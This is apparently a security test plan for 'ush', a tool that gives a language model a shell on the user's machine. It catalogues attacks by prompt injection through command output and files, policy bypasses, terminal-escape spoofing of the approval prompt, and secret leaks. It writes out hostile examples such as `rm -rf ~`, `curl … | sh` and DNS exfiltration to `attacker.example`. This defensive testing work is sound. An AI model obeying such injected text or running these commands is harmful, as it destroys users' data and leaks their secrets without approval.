# ush security tests

Status: 2026-10-27, ush 0.1.0 plus the local Ollama provider (TODO 2.8). Threat model:
[SEC.md](SEC.md). Each class below lists what it attacks, how it is tested, and whether a
committed test covers it today or a TODO item tracks the gap.

ush gives a language model a shell on the user's machine, possibly as root. Most of its attack
surface is therefore *indirect*: text the model reads (command output, files, piped input) tries
to steer it, and ush must make sure that no steering reaches the system without the user's
approval, the user is never misled about what they approve, and nothing secret leaves the
machine. The tests are organised by that goal, not by module.

## Test levels

| Level | What | When | Cost |
| --- | --- | --- | --- |
| 1. Deterministic adversarial tests | Scripted fake provider or mock API returns the attacker's tool calls; assertions on what ran, what was shown, and what was sent | Every commit (`just ush-test`, `just ci`) | None |
| 2. Model-in-the-loop injection evals | A real model reads poisoned command output from a fixture corpus; we measure what it *tries*, and assert that ush blocks it | Before a release; on policy or prompt changes | Free on a local Ollama model, paid on Anthropic (opt-in, TODO 2.11) |
| 3. Manual review and red team | sudo/keychain on real machines, terminal rendering in real emulators, new GTFOBins entries | Before a release | Human time |

Level 1 is the gate: it never depends on a model behaving well. Level 2 answers a different
question, how often a model *attempts* something unsafe, which the policy must then contain. A
small local model is a useful worst case there: it follows injected instructions more readily.

## 1. Prompt injection through what the model reads

The model reads untrusted text: command output, file contents, file names, piped stdin, error
messages, and history entries. Injected text can ask it to run something destructive, to leak
data, or to mislead the user.

| Attack | Expected behaviour | Status |
| --- | --- | --- |
| Output tells the model to run `rm -rf ~` / `curl … \| sh` | The call reaches the approval prompt; without a terminal it is declined | Covered: `test_injected_instructions_in_output_cannot_run_destructive_commands`, `test_other_commands_need_approval_with_a_reason` |
| Model claims `effect: "read"` for a mutating command | The policy decides, not the claim | Covered: `test_model_claim_of_read_does_not_bypass_the_policy` |
| Injection through piped stdin (`cat log \| ush //…`) | Treated as data; same policy | Covered in part: `test_request_with_piped_input_history_and_replay` |
| Injection that exfiltrates through an auto-approved command, e.g. `dig <data>.attacker.example` | Network lookups whose arguments the model chose need approval, or are limited to names already on screen | **Gap (F2), TODO 2.10** |
| Injection that writes a crafted script and asks for approval with a harmless `purpose` | The user sees the full source, not only the purpose | Covered: `test_scripts_always_need_approval`; display integrity: §3 |
| Injection via a tampered history entry replayed with `ush replay` | Replay reapplies the policy | Covered: `test_request_with_piped_input_history_and_replay` |
| Model-in-the-loop corpus: poisoned `README`, log lines, `git log` messages, file names, DNS TXT records, HTML from `curl` | Count attempted unsafe calls per model; assert zero ran unapproved | **Gap, TODO 2.11** |

## 2. Policy bypass: "read-only" that isn't

The policy auto-approves commands it can classify as read-only. An attacker (or a confused
model) needs only one command line it misclassifies.

| Attack | Status |
| --- | --- |
| Shell syntax: substitutions, `$(…)`, backticks, process substitution, redirections, `&`, `;` after comments, brace/`=` expansion, glob qualifiers, multi-line | Covered: `test_policy` (`test_variables_expand_before_checks`, `test_glob_cannot_smuggle_options`, …) |
| Option smuggling through globs and variables (`find *` with a file named `-delete`) | Covered: `test_glob_cannot_smuggle_options` |
| Write or exec options of listed tools (`find -exec/-fprint`, `sed -i/w/e`, `sort -o`, `awk system()`, `xxd -r`, `git -c core.pager=…`, `tar --checkpoint-action`, `man -P`, `env`/`xargs`/`nice`/`timeout` wrappers) | Partly covered per validator in `test_policy`; **systematic GTFOBins sweep: TODO 2.11** |
| Differential fuzzing: random command lines split by ush's tokenizer and by `zsh -f` (`${(z)…}`); any disagreement on a line the policy accepts is a failure | **Gap, TODO 2.11** |
| `PATH` hijack: a `df` earlier on `PATH` than `/bin` (e.g. `.` or a user-writable directory) | Residual risk in SEC; **test: warn when PATH contains writable or relative entries, TODO 2.11** |

## 3. Display integrity: what the user approves is what runs

The approval prompt is the main control, so anything that changes what the user *sees* is as
serious as a policy bypass.

| Attack | Expected behaviour | Status |
| --- | --- | --- |
| Command containing `\r`, `\x1b[2K`, cursor movement, or `\b` that redraws the line as something harmless | Control characters are shown visibly (e.g. `\r`, `␛`) in the prompt, script listing, and output, never sent to the terminal | **Gap (F1), TODO 2.9** — today ush prints commands, scripts, output, and answers raw |
| Command output with OSC sequences: window title, OSC 52 clipboard write, OSC 8 links, terminal reports that inject input | Same: output is neutralised before display | **Gap (F1), TODO 2.9** |
| Unicode bidi overrides (U+202E, "Trojan Source"), zero-width characters, homoglyphs in commands | Shown visibly or flagged in the prompt | **Gap (F1), TODO 2.9** |
| Very long or many-line commands that push the dangerous part off screen | Full command shown before approval; long lines wrapped, not truncated | **Gap, TODO 2.9** |

Tests drive the real `Terminal` with a fake command and compare the rendered bytes; a pty test
confirms nothing raw reaches the terminal.

## 4. Secrets and disclosure

| Attack or failure | Status |
| --- | --- |
| Known token formats, private keys, URL credentials, `password=` assignments in output | Covered: `test_redact` |
| API key in requests, command environments, history, `ai status`, argv (keychain) | Covered: `test_provider_credentials_are_not_passed_to_commands`, `test_keychain_store_keeps_key_out_of_argv`, `test_ai_status_never_prints_the_key`, history assertions in `test_cli` |
| Reading secret paths (`~/.ssh`, keychains, `.env`) without approval | Covered: `test_reading_secret_files_needs_approval` |
| Anthropic key sent to a local Ollama | Covered: `test_requests_carry_no_anthropic_options_and_no_real_key` |
| Banner says data stays local while it doesn't (Ollama cloud model) | Covered: `test_ollama_cloud_model_is_disclosed`, `test_cloud_models_are_never_reported_as_local` |
| Redaction corpus: gitleaks' rule set as test vectors | **Gap, TODO 2.11** |

## 5. Endpoint and egress

| Attack | Status |
| --- | --- |
| Non-loopback Ollama URL from settings or environment (`http://192.168.…`, `localhost.evil.example`, userinfo, paths) | Covered: `test_ollama_urls_must_be_on_this_machine`, `test_ollama_misconfiguration_fails_before_any_request` |
| Proxy variables routing "local" requests elsewhere | Covered: `test_requests_carry_no_anthropic_options_and_no_real_key` (bogus `HTTP_PROXY`/`ALL_PROXY`) |
| Redirect from the local endpoint to a remote host | Redirects are not followed (code); **test: TODO 2.11** |
| `USH_BASE_URL` or `USH_*` from `sudo -E` | `USH_*` covered: `test_environment_overrides_apply_to_users_but_not_to_root`; `USH_BASE_URL` under root: **test: TODO 2.11** |

## 6. Privilege and sudo

| Attack | Status |
| --- | --- |
| Root uses a user-writable install (`~/.local/lib/ush`) | Documented; root-owned install via `install.sh --prefix` |
| `XDG_*`, `PYTHON*`, rc files under root | Covered: `test_root_ignores_xdg_overrides`, `test_user_rc_files_do_not_change_commands`; launcher uses `python -I` |
| Symlinked or foreign-owned credentials | Covered: `test_insecure_or_linked_credentials_are_refused` |
| Symlink planted at the history or config path (root writes through it) | **Gap, TODO 2.11** |
| Keychain under sudo | Manual: TODO 2.2 |

## 7. Robustness and resource limits

| Attack | Status |
| --- | --- |
| Endless or huge output, binary output, invalid UTF-8 | Covered in part: `test_output_is_bounded_keeping_head_and_tail`; binary/UTF-8 cases: **TODO 2.11** |
| Hanging commands, pipelines that ignore SIGTERM, interrupt | Covered: `test_timeout_stops_the_whole_pipeline`, `test_interrupt_cancels_and_kills` |
| Runaway agent loop | Covered: `test_step_limit` |
| Malformed, truncated, or unknown tool calls | Covered: `test_invalid_tool_input_is_returned_as_an_error`, `test_truncated_tool_input_is_not_run`, `test_tool_schemas_are_strict` |
| Oversized piped input | Bounded at 200 KB in code; **test: TODO 2.11** |

## 8. Supply chain

Hashed `requirements.lock`, `pip-audit` before a release, gitleaks on every CI run
([.gitleaksignore](../../.gitleaksignore) lists reviewed fixtures by fingerprint), actions pinned
by commit. See [tools/ci/README.md](../../tools/ci/README.md).

## Open findings

| ID | Finding | Severity | Status |
| --- | --- | --- | --- |
| F1 | Commands, scripts, output, and answers are written to the terminal unfiltered. A command with `\r` or escape sequences can display as something harmless in the approval prompt, and command output can drive the terminal (OSC 52 clipboard writes, titles, input reports). | High: defeats the approval prompt | Open, TODO 2.9 |
| F2 | `dig`, `host`, and `nslookup` are auto-approved with any arguments, so injected instructions can leak data the model has seen through DNS names. | Medium: exfiltration without approval; needs a successful injection | Open, TODO 2.10 |

## Release gate

For every release candidate, per [CLAUDE.md](../../CLAUDE.md): run level 1 on each supported OS
and Python (`just ci`, plus Linux), run level 2 at least on one local Ollama model and record the
attempted/blocked counts, do the level 3 manual checks, and confirm no open finding rated High.
